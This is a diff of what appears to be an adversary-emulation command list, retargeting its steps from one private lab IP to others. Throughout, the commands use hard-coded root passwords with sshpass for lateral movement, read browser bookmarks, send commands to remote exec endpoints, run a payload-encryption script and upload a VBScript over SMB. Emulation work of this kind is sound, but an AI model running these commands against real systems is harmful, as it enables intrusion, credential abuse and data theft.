@@ -10,7 +10,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'RootPass123' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /usr/bin/wget root@172.21.0.20:/tmp/wget && sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p 'RootPass123' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/wget root@172.22.0.20:/tmp/wget'"
+        "command": "sshpass -p 'RootPass123' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /usr/bin/wget root@192.168.20.30:/tmp/wget && sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@192.168.20.30 'sshpass -p 'RootPass123' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/wget root@192.168.30.40:/tmp/wget'"
       }
     ]
   },
@@ -25,7 +25,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -k http://172.21.0.20/"
+        "command": "curl -k http://192.168.20.30/"
       }
     ]
   },
@@ -40,7 +40,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'Passw0rd' ssh attacker@172.21.0.20 'cat /home/attacker/.config/chromium/Default/Bookmarks'"
+        "command": "sshpass -p 'Passw0rd' ssh attacker@192.168.20.30 'cat /home/attacker/.config/chromium/Default/Bookmarks'"
       }
     ]
   },
@@ -55,7 +55,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -X POST -d $(echo -n 'id' | base64) http://172.21.0.20:8083/ | base64 -d"
+        "command": "curl -X POST -d $(echo -n 'id' | base64) http://192.168.20.30:8083/ | base64 -d"
       }
     ]
   },
@@ -70,7 +70,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'python3 -c \"import sys; print(\\\"Commands to send and receive malicious emails here.\\\")\"'"
+        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@192.168.20.30 'python3 -c \"import sys; print(\\\"Commands to send and receive malicious emails here.\\\")\"'"
       }
     ]
   },
@@ -85,7 +85,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'python3 /root/encrypt_payload.py > /tmp/encrypted_payload.b64'"
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'python3 /root/encrypt_payload.py > /tmp/encrypted_payload.b64'"
       }
     ]
   },
@@ -100,7 +100,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -X POST -F 'cmd=whoami' http://172.21.0.20:5055/exec && curl -X POST -F 'cmd=uname -a' http://172.21.0.20:5055/exec"
+        "command": "curl -X POST -F 'cmd=whoami' http://192.168.20.30:5055/exec && curl -X POST -F 'cmd=uname -a' http://192.168.20.30:5055/exec"
       }
     ]
   },
@@ -115,7 +115,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "rm -f /tmp/vb.vbs && printf 'Set objNetwork = CreateObject(\"WScript.Network\")\\nstrComputer = \"%s\"\\nSet objFSO = CreateObject(\"Scripting.FileSystemObject\")\\nSet objShell = CreateObject(\"WScript.Shell\")\\nobjShell.Run \"cmd /c dir \\\\\\\\172.21.0.20\\\\share\\\\test.txt > C:\\\\Windows\\\\Temp\\\\out.txt\", 0, True\\n' 172.21.0.20 > /tmp/vb.vbs && smbclient \\\\\\\\172.21.0.20\\\\share -U DebianUser%DebianUser -c 'put /tmp/vb.vbs vb.vbs' && rpcclient 172.21.0.20 -U DebianUser%DebianUser -c 'srvsvc' && echo 'Executed VBScript upload and remote file access on 172.21.0.20'"
+        "command": "rm -f /tmp/vb.vbs && printf 'Set objNetwork = CreateObject(\"WScript.Network\")\\nstrComputer = \"%s\"\\nSet objFSO = CreateObject(\"Scripting.FileSystemObject\")\\nSet objShell = CreateObject(\"WScript.Shell\")\\nobjShell.Run \"cmd /c dir \\\\\\\\192.168.20.30\\\\share\\\\test.txt > C:\\\\Windows\\\\Temp\\\\out.txt\", 0, True\\n' 192.168.20.30 > /tmp/vb.vbs && smbclient \\\\\\\\192.168.20.30\\\\share -U DebianUser%DebianUser -c 'put /tmp/vb.vbs vb.vbs' && rpcclient 192.168.20.30 -U DebianUser%DebianUser -c 'srvsvc' && echo 'Executed VBScript upload and remote file access on 192.168.20.30'"
       }
     ]
   },
